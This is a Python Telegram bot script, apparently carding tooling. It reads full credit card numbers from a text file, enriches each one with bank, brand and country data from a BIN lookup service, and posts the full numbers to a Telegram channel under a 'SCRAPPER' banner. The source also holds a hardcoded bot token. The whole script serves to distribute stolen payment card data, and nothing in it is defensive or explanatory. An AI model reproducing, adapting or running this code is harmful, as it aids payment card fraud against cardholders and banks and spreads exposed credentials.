import telebot
import threading
import time
import requests

TOKEN = "7831390709:AAHeP1BFaVGpdQKVmlvtZ5GJnF4qAUejXnY"
bot = telebot.TeleBot(TOKEN)
CHANNEL_NAME = -1002585562900

def get_bin_info(bin_number):
    api_url = "https://bins.antipublic.cc/bins/{}".format(bin_number)
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            bin_data = response.json()
            return bin_data
        else:
            return None
    except Exception as e:
        print("Error fetching bin info:", e)
        return None

def format_bin_info(bin_data, full_cc):
    cc = bin_data.get("bin", "")
    brand = bin_data.get("brand", "")
    card_type = bin_data.get("type", "")
    level = bin_data.get("level", "")
    bank = bin_data.get("bank", "")
    country_name = bin_data.get("country_name", "")
    country_flag = bin_data.get("country_flag", "")

    formatted_info = f"""<b> 
❆═══»  𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{full_cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ {cc[:6]}
｢𝙸𝙽𝙵𝙾」➔ {brand} - {card_type} - {level}
｢𝙱𝙰𝙽𝙺」➔ {bank}
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country_name} - {country_flag}
❆═══»  𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @E_M_O_2 
</b>"""
    return formatted_info

def send_file_lines_to_channel(cc_file):
    with open(cc_file, "r") as file:
        for line in file:
            full_cc = line.strip()
            bin_info = get_bin_info(full_cc[:6])
            if bin_info:
                formatted_info = format_bin_info(bin_info, full_cc)
                bot.send_message(CHANNEL_NAME, formatted_info, parse_mode="html")
                time.sleep(10)
                print(full_cc)
            else:
                print(f"Error fetching bin info for {full_cc}")

send_file_lines_to_channel("EMO.txt")

def recibir_msg():
    bot.infinity_polling()

recibir_msg()